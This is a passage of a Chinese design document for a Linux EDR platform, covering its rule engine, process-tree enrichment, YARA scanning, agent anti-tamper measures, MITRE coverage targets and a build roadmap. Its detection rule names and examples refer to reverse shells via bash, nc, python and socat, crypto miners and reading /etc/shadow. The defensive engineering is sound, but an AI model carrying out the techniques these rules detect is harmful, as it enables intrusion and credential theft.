│  │   ancestor_chain: "sshd→bash→python→curl" (8 层)   │  │
│  │   ancestor_exe: 所有祖先 exe 拼接 (用于 contains)  │  │
│  │   tree_depth: 进程树深度                            │  │
│  │   tree_complete: 祖先链是否完整 (bool)              │  │
│  │   is_shell_child: 父进程是否为 shell                │  │
│  │   session_leader: 会话领导进程                      │  │
│  │                                                     │  │
│  │ 内存: ~200B/node × 500 进程/主机 × 1000 主机       │  │
│  │       ≈ 100MB (可接受)                              │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ CEL 规则引擎 (CELEngine) — 增强版                   │  │
│  │                                                     │  │
│  │ 现有能力:                                           │  │
│  │   • CEL 表达式编译 + 缓存                          │  │
│  │   • RWMutex 保护的规则热加载                        │  │
│  │   • DataType 预过滤                                │  │
│  │                                                     │  │
│  │ 新增自定义函数:                                     │  │
│  │   count_recent(event, window_s, threshold) → bool  │  │
│  │     "10s 内同主机 exec > 5 次"                      │  │
│  │     底层: Redis ZRANGEBYSCORE 滑动窗口              │  │
│  │                                                     │  │
│  │   ioc_match(field_name) → bool                     │  │
│  │     "remote_addr 命中恶意 IP"                       │  │
│  │     底层: Redis SISMEMBER                           │  │
│  │                                                     │  │
│  │   ancestor_has(exe_name) → bool                    │  │
│  │     "祖先链中包含 nginx"                            │  │
│  │     底层: 进程树查找                                │  │
│  │                                                     │  │
│  │   first_seen(exe, days) → bool                     │  │
│  │     "该二进制首次出现 < 1 天"                       │  │
│  │     底层: Redis SET + TTL                           │  │
│  │                                                     │  │
│  │   is_private_ip(addr) → bool                       │  │
│  │     "判断内网地址"                                  │  │
│  │     底层: 纯计算                                    │  │
│  │                                                     │  │
│  │ 性能优化:                                           │  │
│  │   • sync.Pool 复用 activation map                  │  │
│  │   • 规则分组并行评估 (4~8 goroutine)               │  │
│  │   • 热点规则置顶 (高命中率优先评估)                 │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ 序列检测器 (SequenceDetector)                       │  │
│  │                                                     │  │
│  │ 现有: 内存态规则 + Redis 中间状态                   │  │
│  │ 新增:                                               │  │
│  │   • 规则持久化到数据库 (CRUD API + 热加载)         │  │
│  │   • YAML 格式序列规则 (见 4.4 节)                  │  │
│  │   • 步骤 CEL 表达式预编译缓存                      │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ 告警聚合器 (AlertAggregator)                        │  │
│  │                                                     │  │
│  │ 策略:                                               │  │
│  │   • 聚合 key: (host_id, rule_id)                   │  │
│  │   • 窗口: 可配置 (默认 5 分钟)                      │  │
│  │   • 窗口内命中: 更新 last_seen_at + hit_count      │  │
│  │   • 窗口外命中: 新建告警                            │  │
│  │   • 实现: Redis key + TTL                          │  │
│  └────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────┘
```

### 5.3 扫描架构整合

```
┌──────────────────────────────────────────────────────────┐
│                     扫描能力矩阵                          │
├─────────────┬────────────────────┬───────────────────────┤
│             │ EDR 事件触发扫描    │ Scanner 任务扫描       │
│             │ (EDR 引擎 内嵌)  │ (独立 Scanner Plugin) │
├─────────────┼────────────────────┼───────────────────────┤
│ 触发方式     │ process_exec       │ 手动任务               │
│             │ file_write         │ 定时调度               │
│             │ EDR 规则命中       │                       │
├─────────────┼────────────────────┼───────────────────────┤
│ 扫描范围     │ 单文件 (exe_path)  │ 全盘 / 指定目录        │
├─────────────┼────────────────────┼───────────────────────┤
│ YARA 规则    │ 高优先级子集       │ 完整规则库             │
│             │ (malware/webshell/ │ (全部分类)             │
│             │  miner, ~50 条)   │                       │
├─────────────┼────────────────────┼───────────────────────┤
│ ClamAV      │ 不使用             │ 使用 (完整签名库)      │
├─────────────┼────────────────────┼───────────────────────┤
│ 延迟目标     │ < 500ms           │ 无限制 (后台运行)      │
├─────────────┼────────────────────┼───────────────────────┤
│ 隔离能力     │ 立即隔离           │ 扫后隔离               │
├─────────────┼────────────────────┼───────────────────────┤
│ 适用场景     │ 实时防护           │ 深度全盘检查           │
├─────────────┼────────────────────┼───────────────────────┤
│ 规则来源     │ 社区仓库 yara/     │ 社区仓库 yara/         │
│             │ (选择性加载)       │ (全量加载)             │
└─────────────┴────────────────────┴───────────────────────┘

EDR 触发 Scanner 的协作场景:
  EDR 发现可疑但不确定 → 通过 Agent 内部通道触发 Scanner
  对特定路径做 ClamAV + 完整 YARA 深度扫描
```

### 5.4 Agent 自保机制 (Anti-Tamper)

```
┌──────────────────────────────────────────────────────────┐
│                  Agent 自保防护体系                        │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Layer 1: 进程守护 (Watchdog)                        │  │
│  │                                                     │  │
│  │ • Watchdog 独立守护进程监控 Agent 存活              │  │
│  │ • Agent 被杀 → Watchdog 自动重启 (最多 5 次/小时) │  │
│  │ • 重启失败 → 上报 Server 告警 (agent_tamper 事件)   │  │
│  │ • 双向心跳: Agent ↔ Watchdog 互相监控              │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Layer 2: 文件保护                                    │  │
│  │                                                     │  │
│  │ • 规则目录 /var/lib/mxsec/rules/ 设置 immutable     │  │
│  │   attr (chattr +i)，仅 Agent 自身可修改             │  │
│  │ • 二进制文件 /usr/local/mxsec/ 设置 immutable       │  │
│  │ • 配置文件 hash 校验，启动时 + 定时验证完整性       │  │
│  │ • 篡改检测 → 上报 Server + 从 Server 重新拉取      │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Layer 3: eBPF 信号监控 (仅 eBPF 模式)               │  │
│  │                                                     │  │
│  │ • tracepoint/signal_deliver 监控发往 Agent 的信号   │  │
│  │ • 拦截 SIGKILL / SIGTERM / SIGSTOP 发送事件        │  │
│  │ • 记录攻击者进程信息 (pid/exe/cmdline/uid)          │  │
│  │ • 生成 agent_tamper_signal 告警 (severity: critical)│  │
│  │ • 注意: eBPF 无法阻止 kill，只能检测 + 告警        │  │
│  │   真正的防杀依赖 Layer 1 Watchdog 快速拉起          │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Layer 4: 通信保活                                    │  │
│  │                                                     │  │
│  │ • Server 端 Heartbeat 超时检测 (默认 3 分钟无心跳)  │  │
│  │ • 超时 → 标记主机 offline + 生成告警                │  │
│  │ • 连续 3 次超时 → 升级为 critical 告警              │  │
│  │ • 恢复上线时自动对比规则版本 + 配置完整性           │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  设计原则:                                               │
│  • 自保 ≠ 不可被卸载 — root 用户通过官方工具可正常卸载 │
│  • 防的是攻击者 kill -9 / rm -rf，不是合法运维操作     │  
│  • 误杀保护: 不阻断任何进程的 kill 操作，仅检测 + 告警 │
│  • 自保失败不影响主机: 最坏情况 = 失去监控，不影响业务 │
└──────────────────────────────────────────────────────────┘
```

---

## 六、性能指标

### 6.1 Agent 端

| 指标 | 目标值 | 测量方式 |
|------|--------|---------|
| CPU 占用 (稳态) | < 3% | /proc/self/stat |
| CPU 占用 (峰值) | < 8% | 压测 |
| 内存占用 | < 50MB | RSS |
| 单事件评估延迟 | < 50μs | benchmark |
| YARA 单文件扫描 | < 500ms | benchmark |
| 规则热加载耗时 | < 100ms | benchmark |
| 事件吞吐量 | > 5000 EPS | 压测 |
| 白名单 Bloom 查询 | < 1μs | benchmark |
| 资源降级 Level 1 | CPU > 60%: 丢弃 file_read/file_open 低危事件 | config_map level |
| 资源降级 Level 2 | CPU > 80%: 仅保留 process_exec/file_write/tcp_connect | config_map level |
| 资源降级 Level 3 | CPU > 95%: 仅保留 process_exec | config_map level |
| 自杀保护 | CPU > 98% 持续 5 分钟: 停止采集 + 上报告警 + 等待 Server 指令 | watchdog |

### 6.2 Server 端

| 指标 | 目标值 | 测量方式 |
|------|--------|---------|
| 单实例 EPS 吞吐 (MVP) | 2~5 万 EPS | 压测 (Phase 1~4 目标) |
| 单实例 EPS 吞吐 (Target) | 10 万 EPS | 压测 (需 Kafka 多分区 + Consumer 水平扩展 + Redis Pipeline) |
| 端到端延迟 (P50) | < 10ms | trace |
| 端到端延迟 (P99) | < 50ms | trace |
| IOC 碰撞延迟 | < 1ms | Redis RTT |
| 进程树查询延迟 | < 1ms | 内存查找 |
| CEL 规则评估 | < 5ms/event (500 条规则) | benchmark |
| 规则热加载 | < 500ms (500 条规则编译) | benchmark |
| 告警写入延迟 | < 10ms | MySQL |
| 进程树内存 | < 200MB (1000 主机) | 监控 |

### 6.3 分层过滤效果预估

```
假设: 单主机 ~2000 原始 EPS (eBPF 内核事件)

Layer 0 (内核态白名单):    2000 → 800 EPS  (-60%)
Layer 1 (用户态预过滤):     800 → 400 EPS  (-50%)
Layer 2 (Agent 规则匹配):   400 EPS 全量评估, ~5 EPS 命中
Layer 3 (YARA 事件触发):    仅对 process_exec 的 exe_path 触发
Layer 4 (上报 Server):      400 EPS → Kafka

Server 端 (1000 主机):
  Kafka 入站:              400K EPS
  Layer 5 (IOC 碰撞):      400K → 400K (注入字段, 不过滤)
  Layer 6 (进程树注入):     400K → 400K (注入字段, 不过滤)
  Layer 7 (CEL 评估):      400K × ~20 条相关规则 = 800 万 eval/s
  Layer 8 (序列检测):       仅对已匹配事件检查序列
  Layer 9 (告警聚合):       ~50 告警/s → 去重后 ~10 告警/s
```

---

## 七、检测覆盖度

### 7.1 四层检测深度模型

```
Level 1: 单事件静态匹配
  • 字符串/正则匹配已知恶意特征
  • 端口/路径/文件名匹配
  • 适用: 已知工具 + 已知特征
  • 误报: 中  |  漏报: 高 (变体/混淆可绕过)

Level 2: 单事件上下文增强
  • IOC 碰撞 (IP/Hash/Domain)
  • 进程上下文 (parent_exe, cwd, tty, env, container)
  • 用户上下文 (uid, username, login_session)
  • 适用: 已知特征 + 行为异常
  • 误报: 低  |  漏报: 中

Level 3: 跨事件关联分析
  • 进程树追溯 (祖先链)
  • 频率统计 (N 事件 / T 秒)
  • 序列检测 (多步攻击链)
  • 时间窗口聚合
  • 适用: 攻击链还原 + 低慢攻击
  • 误报: 很低  |  漏报: 低

Level 4: 威胁情报 + YARA 联动
  • IOC 实时碰撞
  • YARA 事件触发扫描
  • 文件首见检测
  • 蜜罐文件诱捕
  • 适用: 0day + 未知威胁 + 确认入侵
  • 误报: 极低  |  漏报: 中 (依赖情报覆盖度)
```

### 7.2 MITRE ATT&CK 覆盖目标

```
战术              当前覆盖             目标覆盖 (200+ 规则)
─────────────────────────────────────────────────────────
初始访问           0/8   (0%)          3/8   (38%)
执行               2/12  (17%)         7/12  (58%)
持久化             3/19  (16%)         8/19  (42%)
权限提升           2/13  (15%)         6/13  (46%)
防御规避           3/42  (7%)          8/42  (19%)
凭据访问           2/16  (13%)         5/16  (31%)
发现               1/31  (3%)          4/31  (13%)
横向移动           1/9   (11%)         4/9   (44%)
收集               0/17  (0%)          3/17  (18%)
C2                3/16  (19%)         6/16  (38%)
数据渗出           1/9   (11%)         3/9   (33%)
影响               1/9   (11%)         3/9   (33%)
─────────────────────────────────────────────────────────
总计              ~15/201 (7.5%)      ~60/201 (30%)
```

### 7.3 规则库目录结构

```
mxsec-rules/
├── rules/
│   ├── L1-static/               # Level 1: 单事件静态匹配
│   │   ├── process/
│   │   │   ├── T1059.004-reverse-shell-bash.yml
│   │   │   ├── T1059.004-reverse-shell-nc.yml
│   │   │   ├── T1059-reverse-shell-python.yml
│   │   │   ├── T1059-reverse-shell-socat.yml
│   │   │   ├── T1496-cryptominer-xmrig.yml
│   │   │   ├── T1496-cryptominer-stratum.yml
│   │   │   ├── T1548-suid-set.yml
│   │   │   ├── T1547-kernel-module-load.yml
│   │   │   ├── T1574-ld-preload-inject.yml
│   │   │   ├── T1070-log-deletion.yml
│   │   │   ├── T1611-container-escape.yml
│   │   │   └── ...
│   │   ├── file/
│   │   │   ├── T1505-webshell-write.yml
│   │   │   ├── T1003-passwd-shadow-modify.yml
│   │   │   ├── T1098-ssh-authorized-keys.yml
│   │   │   ├── T1037-systemd-persistence.yml
│   │   │   ├── T1548-sudoers-modify.yml
│   │   │   └── ...
│   │   └── network/
│   │       ├── T1571-c2-common-ports.yml
│   │       ├── T1496-mining-pool-ports.yml
│   │       ├── T1090-tor-proxy.yml
│   │       ├── T1048-dns-tunnel-port53.yml
│   │       └── ...
│   │
│   ├── L2-contextual/           # Level 2: 上下文增强
│   │   ├── T1059-tmp-exec-non-root.yml
│   │   ├── T1071-c2-ioc-ip-match.yml
│   │   ├── T1105-download-exec-chain.yml
│   │   └── ...
│   │
│   ├── L3-correlation/          # Level 3: 跨事件关联
│   │   ├── T1059-web-shell-spawn.yml
│   │   ├── T1110-ssh-bruteforce.yml
│   │   ├── T1496-crypto-behavior.yml
│   │   └── ...
│   │
│   └── L4-advanced/             # Level 4: 高级检测
│       ├── sequences/
│       │   ├── apt-web-intrusion-chain.yml
│       │   ├── ransomware-kill-chain.yml
│       │   ├── lateral-movement-chain.yml
│       │   └── ...
│       └── honeypot/
│           ├── honeypot-ssh-key-read.yml
│           ├── honeypot-mysql-backup.yml
│           └── ...
│
├── yara/
│   ├── malware/
│   │   ├── linux-elf-backdoor.yar
│   │   ├── coinminer-generic.yar
│   │   ├── ransomware-linux.yar
│   │   └── ...
│   ├── webshell/
│   │   ├── php-webshell.yar
│   │   ├── jsp-webshell.yar
│   │   └── ...
│   ├── tools/
│   │   ├── pentest-tool-generic.yar
│   │   ├── rootkit-signature.yar
│   │   └── ...
│   └── packer/
│       ├── upx-packed.yar
│       └── elf-obfuscated.yar
│
├── ioc/
│   ├── abuse-ch-ip.csv
│   ├── abuse-ch-hash.csv
│   └── abuse-ch-domain.csv
│
├── manifest.json
│   {
│     "version": "2024.06.1",
│     "rules_count": 200,
│     "yara_count": 50,
│     "ioc_updated": "2024-06-15T00:00:00Z",
│     "checksum": "sha256:..."
│   }
│
└── schema/
    └── rule-schema.json         # JSON Schema 验证规则格式
```

---

## 八、命中率优化

### 8.1 降低误报 (False Positive)

| 机制 | 实现方式 | 效果 |
|------|---------|------|
| 白名单 | 按 host/exe/path/cmdline/hash 配置 | 运维自动化、CI/CD 等已知行为跳过 |
| 多维条件 | 规则加入 parent_exe/cwd/uid/container 上下文 | "cat /etc/shadow" 区分 root 自动化 vs 攻击者 |
| 频率降级 | 低频命中 (单次/偶发) 降级为 info | 不产生告警，仅记录 |
| 置信度评分 | 每条规则 confidence 字段 (0-100) | 低置信度规则需多条同时命中才告警 |
| 行为基线学习 | 新 Agent 上线 7 天进入学习模式 (见下方详细说明) | 建立正常行为基线 + 自动白名单建议 |
| 告警聚合 | 同 host+rule 窗口内合并 | 避免告警风暴 |

#### 行为基线学习模式详细设计

```
目标: 新 Agent 上线 7 天内自动学习主机正常行为，生成白名单建议，降低正式启用后的误报

┌─────────────────────── 学习期 (Day 1~7) ───────────────────────┐
│                                                                 │
│  采集阶段 (Agent 端):                                           │
│  • 全量采集事件，规则正常评估但不产生告警                       │
│  • 命中事件标记为 learning_hit，全部上报 Server                 │
│  • Agent 本地统计:                                              │
│    - 高频进程 Top 100 (exe + cmdline hash)                     │
│    - 高频网络目标 Top 50 (remote_addr:port)                    │
│    - 高频文件操作路径 Top 50 (dir prefix)                      │
│                                                                 │
│  分析阶段 (Server 端):                                          │
│  • 聚合 7 天 learning_hit 数据                                  │
│  • 按 rule_id 统计命中频率:                                     │
│    - 命中 > 100 次/天 → 高概率误报，加入白名单建议             │
│    - 命中 1~10 次/天 → 可能误报，需人工确认                    │
│    - 命中 0 次 → 正常                                          │
│  • 生成白名单建议报告:                                          │
│    {                                                            │
│      "host_id": "xxx",                                         │
│      "learning_period": "2026-05-15 ~ 2026-05-22",             │
│      "suggestions": [                                          │
│        {                                                        │
│          "rule_id": "MXEDR-0042",                              │
│          "hit_count": 1847,                                    │
│          "sample_events": [...],                                │
│          "suggested_whitelist": {                               │
│            "type": "exe_path",                                 │
│            "value": "/opt/deploy/scripts/health_check.sh"      │
│          },                                                     │
│          "recommendation": "auto_whitelist"                    │
│        }                                                        │
│      ]                                                          │
│    }                                                            │
│                                                                 │
│  管理员确认:                                                     │
│  • 学习期结束 → 管理后台展示白名单建议报告                     │
│  • 管理员逐条确认: 采纳 / 忽略 / 调整                         │
│  • 采纳的白名单自动下发到 Agent                                │
│  • 学习期可延长 (二次学习)                                     │
│                                                                 │
│  安全底线:                                                       │
│  • severity == critical 的规则在学习期内也产生告警               │
│  • IOC 碰撞命中在学习期内也产生告警                             │
│  • 自动白名单建议仅针对 severity <= medium 的规则               │
│  • 白名单永远不自动生效，必须管理员确认                         │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2 降低漏报 (False Negative)

| 机制 | 实现方式 | 效果 |
|------|---------|------|
| 多变体覆盖 | 同一 TTP 多条规则覆盖不同实现 | bash/python/perl/ruby 反弹 Shell 全覆盖 |
| IOC 兜底 | 规则未命中但 IOC 碰撞 → 仍告警 | 未知手法但已知恶意目标 |
| YARA 兜底 | cmdline 无特征但 exe 二进制有特征 → 告警 | 混淆命令行但文件签名不变 |
| 行为序列 | 单步合法但序列异常 → 告警 | 低慢攻击的各步骤单独看合法 |
| 首见检测 | 首次出现的 exe + 外连行为 → 高危 | 0day 工具无已知特征但行为异常 |
| 蜜罐文件 | 诱饵文件被读取 → 确认入侵 | 无特征依赖的纯行为检测 |

### 8.3 规则质量度量

每条规则自动维护运行时统计：

```json
{
  "rule_id": "MXEDR-0001",
  "stats": {
    "total_eval": 1284000,
    "total_match": 47,
    "match_rate": "0.0037%",
    "avg_eval_us": 12,
    "false_positive": 3,
    "confirmed": 41,
    "precision": "93.2%",
    "last_hit": "2024-06-10T14:23:00Z"
  }
}
```

健康度判定规则：
- precision < 50% → 标记为低质量，建议优化或禁用
- match_rate == 0 且 total_eval > 100 万 → 降低评估优先级
- avg_eval_us > 100μs → 正则过复杂，需优化

---

## 九、实施路径

```
Phase 1: 基础引擎 (替换 Tetragon)                      预计 4~6 周
├── 1.1 cilium/ebpf 进程事件采集 (tracepoint)
├── 1.2 cilium/ebpf 文件事件采集 (fentry/kprobe)
├── 1.3 cilium/ebpf 网络事件采集 (fentry/kprobe)
├── 1.4 Hook 优先级探测 (fentry → kprobe 自动降级; BPF LSM 预留 Phase 2 增强)
├── 1.5 用户态 fallback (cn_proc + fanotify + /proc)
├── 1.6 /proc 初始快照 + 定时对账 (5 分钟)
├── 1.7 事件管道对接 (替换 TetragonClient)
├── 1.8 采集模式自动探测 + 能力等级上报
├── 1.9 动态资源降级 (4 级事件优先级采样)
└── 验证: 事件类型/字段与当前一致, 规则不需修改; fentry 优先生效; /proc 快照完整; 资源降级平滑

Phase 2: Agent 端规则引擎                               预计 2~3 周
├── 2.1 YAML 规则解析器 + JSON Schema 验证
├── 2.2 event_type 索引 + 条件短路匹配引擎
├── 2.3 正则预编译 + Bloom Filter 白名单
├── 2.4 响应执行器 (kill/quarantine/alert)
├── 2.5 规则热加载 + 版本管理
├── 2.6 Agent 自保: Watchdog 进程守护 + 文件 immutable 保护
└── 验证: Agent 端可独立检测 + 阻断; Plugin 被 kill 后自动拉起

Phase 3: 规则生态                                       预计 3~4 周
├── 3.1 社区规则仓库初始化 (mxsec-rules)
├── 3.2 内置规则迁移: CEL → YAML 双格式
├── 3.3 Server 规则同步 (Git pull + 合并)
├── 3.4 Agent 规则订阅 (Heartbeat 增量下发)
├── 3.5 规则本地测试 CLI 工具 (mxsec-rule-test)
├── 3.6 规则测试数据集 (正/负样本)
├── 3.7 CI/CD Pipeline (GitHub Actions: 格式+编译+样本+性能检查)
└── 验证: 规则从仓库到 Agent 全链路自动同步; PR 提交自动验证通过

Phase 4: Server 端引擎增强                              预计 3~4 周
├── 4.1 IOC 接入检测流水线
├── 4.2 进程树构建 + /proc 快照接入 + 孤儿节点处理 + 字段注入
├── 4.3 CEL 自定义函数 (ioc_match/ancestor_has/count_recent/first_seen)
├── 4.4 告警聚合去重
├── 4.5 序列检测规则持久化 + API
├── 4.6 CEL 并行评估优化
├── 4.7 行为基线学习模式 (7 天静默 + 白名单建议报告)
└── 验证: L1~L3 检测能力完整; 新 Agent 学习期结束后白名单建议可查看

Phase 5: YARA 联动                                      预计 1~2 周
├── 5.1 EDR 引擎 内嵌 yara-x
├── 5.2 async 异步扫描模式 (默认: 先放行后扫描后隔离)
├── 5.3 pre-block 同步扫描模式 (SIGSTOP/SIGCONT/SIGKILL 流程)
├── 5.4 YARA 规则纳入社区仓库
├── 5.5 EDR ↔ Scanner 协作通道
└── 验证: async 模式进程启动零延迟; pre-block 模式 500ms 超时放行; 与 Scanner 互补

Phase 6: 事件采集增强                                    预计 2~3 周
├── 6.1 DNS 事件采集 (kprobe/udp_sendmsg dst_port=53)
├── 6.2 文件 rename/unlink/chmod 事件
├── 6.3 进程事件增加 cwd/tty/env 字段
├── 6.4 网络事件增加 bytes/direction
├── 6.5 eBPF 信号监控 (signal_deliver → Agent 自保告警)
├── 6.6 用户态模式下高级规则自动禁用逻辑
└── 验证: 新事件类型可被规则引用; Agent 被 kill -9 时产生 tamper 告警

Phase 7: 事件可靠性与数据安全                             预计 2~3 周
├── 7.1 WAL 本地缓冲 (500MB 上限, 分段文件, 崩溃恢复)
├── 7.2 事件排序保证 (host_id Kafka Key + agent_timestamp + 5s 重排窗口)
├── 7.3 mTLS 通信 (Ed25519 CA, 90 天证书, 自动轮换)
├── 7.4 规则签名验证 (Ed25519 签名, Agent 端校验)
├── 7.5 敏感字段脱敏 (env 变量 / cmdline 密码参数)
└── 验证: 网络中断期间事件不丢失; 证书过期前自动轮换; 脱敏字段不可还原

Phase 8: 容器与 K8s 环境                                 预计 3~4 周
├── 8.1 ContainerRuntime 适配器 (containerd/CRI-O/Docker/Podman 自动探测)
├── 8.2 容器 ID 提取 (eBPF cgroup_id + 用户态 /proc/pid/cgroup)
├── 8.3 K8s 上下文注入 (Downward API + Kubelet API → pod/namespace/labels)
├── 8.4 容器逃逸检测规则 (mount namespace / CAP_SYS_ADMIN / nsenter)
├── 8.5 DaemonSet 部署模板 + Helm Chart
└── 验证: 容器内进程事件带完整 K8s 上下文; 逃逸行为触发告警

Phase 9: 运维体系                                        预计 2~3 周
├── 9.1 Agent 注册 / 升级 / 注销全生命周期管理
├── 9.2 灰度升级 (分批 + 自动回滚)
├── 9.3 健康心跳体系 (Agent 状态 + 组件健康 + 能力上报)
├── 9.4 管理后台 (Agent 地图、版本分布、规则覆盖率仪表盘)
├── 9.5 响应动作熔断器 (kill > 50/5min 自动熔断 + 管理员解除)
├── 9.6 规则灰度发布 (5% → 20% → 50% → 100% + dry_run 模式)
└── 验证: 升级失败自动回滚; 熔断触发后响应停止; 灰度命中比例准确

Phase 10: 行为检测引擎 (BDE)                              预计 3~4 周
├── 10.1 Agent 端 BehaviorCollector (4 维实时统计 + 滑动窗口)
├── 10.2 Server 端 BehaviorEngine (基线存储 + 偏差计算 + risk_score)
├── 10.3 跨主机全局基线 (同 exe 多主机行为交集)
├── 10.4 BDE 告警生成 + 与规则引擎集成
├── 10.5 用户态降级 (3 维基线, 无 syscall)
└── 验证: 基线 7 天成熟后异常行为检出; 跨主机基线对单机异常有效; 降噪机制不误报

Phase 11: 攻击故事线引擎                                   预计 3~4 周
├── 11.1 Agent 端 CausalTracker (story_id 分配 + 进程树传播)
├── 11.2 Server 端 StorylineEngine (聚合 + 阶段识别 + 评分)
├── 11.3 跨主机故事线关联 (SSH/横向移动场景)
├── 11.4 故事线可视化 (时间线 + 进程树 + 阶段标记)
├── 11.5 故事线 API (查询/关闭/升级/导出报告)
└── 验证: 多步攻击自动关联为单一故事线; 阶段识别准确; UI 时间线可读

Phase 12: 威胁狩猎 (MQL)                                   预计 3~4 周
├── 12.1 MQL 编译器 (Lexer → Parser → AST → ClickHouse SQL)
├── 12.2 内置函数库 (is_private_ip/ancestor_has/geoip 等)
├── 12.3 查询安全护栏 (时间强制/行数限制/超时/并发控制)
├── 12.4 定时狩猎任务 (schedule + lookback + alert_on_hit)
├── 12.5 交互式查询界面 (编辑器 + 自动补全 + 查询历史 + 模板)
└── 验证: MQL 覆盖常见狩猎场景; 编译 SQL 性能达标; 护栏有效防全表扫描

Phase 13: 自动编排 (Playbook)                              预计 3~4 周
├── 13.1 Playbook YAML 解析器 + 步骤执行引擎
├── 13.2 action 类型实现 (kill/isolate/scan/notify/approval/webhook)
├── 13.3 审批节点 (待办生成 + 超时升级 + 管理后台审批界面)
├── 13.4 执行状态持久化 + Server 重启恢复
├── 13.5 内置 Playbook 模板 (勒索/反弹Shell/挖矿/凭据/逃逸)
├── 13.6 Playbook 与熔断器集成
└── 验证: 勒索 Playbook 端到端执行; 审批流程正确; 重启后恢复执行

Phase 14: 主机网络隔离                                     预计 2~3 周
├── 14.1 eBPF cgroup/connect 出站隔离 (BPF Map 白名单策略)
├── 14.2 XDP 入站过滤 (可选, 高性能丢包)
├── 14.3 三级隔离策略 (选择性/标准/完全)
├── 14.4 隔离生命周期管理 (指令 → 生效 → 审批解除)
├── 14.5 用户态降级 (iptables + nftables + 巡检, 已有实现)
└── 验证: eBPF 隔离攻击者无法绕过; 管控通道始终可达; Level 3 仅管控通信

Phase 15: 内存威胁检测                                     预计 2~3 周
├── 15.1 eBPF 内存操作监控 (memfd_create/ptrace/mmap/mprotect)
├── 15.2 JIT 白名单过滤 (eBPF Map 内核层丢弃正常 JIT 事件)
├── 15.3 /proc/[pid]/mem YARA 扫描 (事件驱动, 非盲扫)
├── 15.4 内存专用 YARA 规则集 (shellcode/beacon/implant)
├── 15.5 用户态降级 (/proc 定时扫描, 已有实现)
└── 验证: memfd 无文件攻击检出; ptrace 注入检出; JIT 不误报

Phase 16: 大规模部署与高可用                               预计 2~3 周
├── 16.1 水平扩展架构 (Kafka Consumer Group + host_id 分片)
├── 16.2 离线 / 气隙网络支持 (规则离线包 + 本地 IOC 库)
├── 16.3 Server 高可用 (Manager 无状态多副本 + Consumer 分区容错)
├── 16.4 多租户字段预留 (tenant_id 贯穿 Agent → Server → 存储)
├── 16.5 规则冲突优先级 + 动作失败处理链
└── 验证: Consumer 宕机后分区自动再平衡; 气隙环境规则可更新; 多租户隔离有效

Phase 17: ML 检测引擎                                      预计 4~6 周
├── 17.1 ELF 特征提取器 (80 维特征, < 2ms)
├── 17.2 LightGBM 模型训练 (EMBER + MalwareBazaar 数据集)
├── 17.3 ONNX 导出 + Agent 端 ONNX Runtime 集成
├── 17.4 Server 端行为 ML (Isolation Forest + 告警优先级模型)
├── 17.5 模型版本化 + 签名 + 灰度下发 + A/B shadow 模式
└── 验证: 静态 ML precision>95%/recall>85%; 灰度无退化; Agent 推理<5ms

Phase 18: 文件信誉与沙箱                                    预计 3~4 周
├── 18.1 文件信誉库 (Redis Hash + NSRL 导入 + MalwareBazaar 同步)
├── 18.2 Agent 端信誉查询 (Bloom Filter → LRU → Server → 异步)
├── 18.3 沙箱适配器 (CAPE/Cuckoo/VirusTotal API 对接)
├── 18.4 沙箱结果回写信誉库 + IOC 自动提取
├── 18.5 文件信誉查询前端页面
└── 验证: 信誉查询 < 5ms; 沙箱提交→结果回写全链路; NSRL 命中跳过检测

Phase 19: 多源威胁情报                                      预计 2~3 周
├── 19.1 情报源适配器 (abuse.ch/OTX/MISP/VirusTotal/ET/Custom)
├── 19.2 情报聚合引擎 (统一格式 + 去重 + 交叉验证评分)
├── 19.3 情报老化管理 (TTL + age_decay + 归档)
├── 19.4 情报管理前端 (来源健康 + IOC 搜索 + 命中趋势)
└── 验证: 6 源同步正常; 多源命中置信度提升; 过期情报自动归档

Phase 20: 远程取证与响应                                    预计 2~3 周
├── 20.1 gRPC 远程 Shell (双向流 + PTY + 审计录制)
├── 20.2 远程文件获取 (分块传输 + SHA256 校验)
├── 20.3 远程内存 Dump (可疑区域导出 + YARA 深度扫描)
├── 20.4 取证包收集 (进程/网络/文件/crontab/服务/用户 快照)
├── 20.5 前端嵌入终端 (xterm.js) + 取证管理界面
└── 验证: Shell 全程审计; 文件完整性校验; 危险命令拦截生效

Phase 21: SOC 级前端                                        预计 4~6 周
├── 21.1 态势感知大屏 (实时指标 + 趋势 + MITRE 热力图 + 威胁地图)
├── 21.2 告警中心 (全生命周期 + 批量操作 + 分析师协作)
├── 21.3 故事线视图 (时间线 + 进程树 + 阶段可视化 + 跨主机)
├── 21.4 威胁狩猎界面 (MQL 编辑器 + 自动补全 + 模板 + 定时任务)
├── 21.5 规则管理 + Playbook 管理 (在线编辑 + 可视化流程)
├── 21.6 主机详情 (资产 + 行为画像 + 告警 + 远程 Shell)
├── 21.7 威胁情报 + 文件信誉页面
└── 验证: 全页面功能可用; 大屏实时刷新; 故事线交互顺畅

Phase 22: 开放 API + 生态集成                               预计 2~3 周
├── 22.1 RESTful API (告警/故事线/主机/规则/狩猎/情报/取证)
├── 22.2 SIEM 对接 (Syslog CEF + Kafka Topic + Splunk HEC)
├── 22.3 通知渠道 (Email/企业微信/钉钉/飞书/Slack/PagerDuty)
├── 22.4 RBAC 8 角色体系 + API Key 管理
├── 22.5 审计日志 (不可删除, ClickHouse 保留 1 年)
└── 验证: API 限流生效; SIEM 格式合规; RBAC 权限隔离; 审计完整

Phase 23: Windows 平台支持                                  预计 6~8 周
├── 23.1 Windows Agent 骨架 (ETW 事件采集)
├── 23.2 Windows 特有事件类型 (registry/service/PowerShell/DLL/WMI)
├── 23.3 PE 文件 ML 特征提取 + 模型训练
├── 23.4 Minifilter 驱动 (可选, 文件实时监控 + 阻断)
├── 23.5 AMSI 集成 + 规则适配 (platform: windows)
├── 23.6 Windows 安装包 (MSI) + 服务模式运行
